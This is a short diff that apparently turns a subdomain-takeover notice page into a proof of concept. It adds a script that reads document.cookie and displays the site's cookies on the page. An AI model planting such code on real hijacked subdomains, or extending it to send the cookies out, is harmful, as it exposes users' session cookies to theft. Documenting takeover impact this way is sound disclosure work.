@@ -17,6 +17,8 @@
         <p>If you are seeing this message it means that this subdomain has been taken over due to a dangling
             DNS
             record. </p>
+        <p>Cookies I have access to from this site now:</p>
+        <div id="cookiediv"></div>
     </div>
 </body>
 
@@ -37,5 +39,9 @@
         font-weight: 300;
     }
 </style>
+
+<script>
+    document.getElementById("cookiediv").innerHTML = document.cookie
+</script>
 
 </html>
